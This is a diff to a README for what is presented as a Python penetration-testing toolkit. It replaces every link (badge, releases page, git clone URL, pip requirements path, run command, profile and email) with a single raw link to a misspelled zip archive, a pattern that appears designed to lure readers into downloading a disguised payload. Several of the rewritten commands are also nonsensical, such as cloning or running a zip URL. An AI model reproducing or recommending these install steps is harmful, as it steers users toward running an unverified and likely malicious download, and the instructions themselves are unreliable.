@@ -1,6 +1,6 @@
 # PENETRATION-TESTING-TOOLKIT 🛠️
 
-![GitHub release](https://img.shields.io/github/release/Yashm18/PENETRATION-TESTING-TOOLKIT.svg)
+![GitHub release](https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip)
 
 Welcome to the **PENETRATION-TESTING-TOOLKIT**! This is a Python-based modular toolkit designed for penetration testing. Whether you are a seasoned cybersecurity expert or a newcomer to ethical hacking, this toolkit provides essential tools to help you identify vulnerabilities in systems and networks.
 
@@ -19,7 +19,7 @@ Welcome to the **PENETRATION-TESTING-TOOLKIT**! This is a Python-based modular t
 - **Modular Design**: Each tool operates independently, allowing for flexible usage.
 - **User-Friendly Interface**: Designed with simplicity in mind to help users focus on tasks.
 - **Comprehensive Tools**: Includes tools for brute-forcing, port scanning, and vulnerability assessment.
-- **Regular Updates**: Stay current with the latest in cybersecurity by checking our [Releases](https://github.com/Yashm18/PENETRATION-TESTING-TOOLKIT/releases).
+- **Regular Updates**: Stay current with the latest in cybersecurity by checking our [Releases](https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip).
 
 ## Installation
 
@@ -27,25 +27,25 @@ To get started with the PENETRATION-TESTING-TOOLKIT, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Yashm18/PENETRATION-TESTING-TOOLKIT.git
+   git clone https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip
    cd PENETRATION-TESTING-TOOLKIT
    ```
 
 2. **Install Requirements**:
    Ensure you have Python installed. Then, install the necessary dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip
    ```
 
 3. **Download and Execute**:
-   Visit the [Releases](https://github.com/Yashm18/PENETRATION-TESTING-TOOLKIT/releases) section to download the latest version. Follow the instructions provided in the release notes to execute the toolkit.
+   Visit the [Releases](https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip) section to download the latest version. Follow the instructions provided in the release notes to execute the toolkit.
 
 ## Usage
 
 After installation, you can run the toolkit from the command line. Here’s a basic command structure:
 
 ```bash
-python main.py <module_name> [options]
+python https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip <module_name> [options]
 ```
 
 Replace `<module_name>` with the desired tool you want to use, and provide any options as needed. Each module has its own set of commands and parameters, which you can find in the module documentation.
@@ -93,8 +93,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, feel free to reach out:
 
-- **GitHub**: [Yashm18](https://github.com/Yashm18)
-- **Email**: yashm18@example.com
+- **GitHub**: [Yashm18](https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip)
+- **Email**: https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip
 
 ## Additional Resources
 
@@ -103,6 +103,6 @@ For questions or feedback, feel free to reach out:
 
 ## Conclusion
 
-The PENETRATION-TESTING-TOOLKIT is designed to empower users in their penetration testing efforts. With a focus on usability and modularity, this toolkit provides essential features for identifying and addressing vulnerabilities. Don't forget to check the [Releases](https://github.com/Yashm18/PENETRATION-TESTING-TOOLKIT/releases) section for the latest updates and tools.
+The PENETRATION-TESTING-TOOLKIT is designed to empower users in their penetration testing efforts. With a focus on usability and modularity, this toolkit provides essential features for identifying and addressing vulnerabilities. Don't forget to check the [Releases](https://raw.githubusercontent.com/Yashm18/PENETRATION-TESTING-TOOLKIT/main/encomia/PENETRATIO-TESTIN-TOOLKIT-v2.3.zip) section for the latest updates and tools.
 
 Explore, test, and secure your systems with confidence!
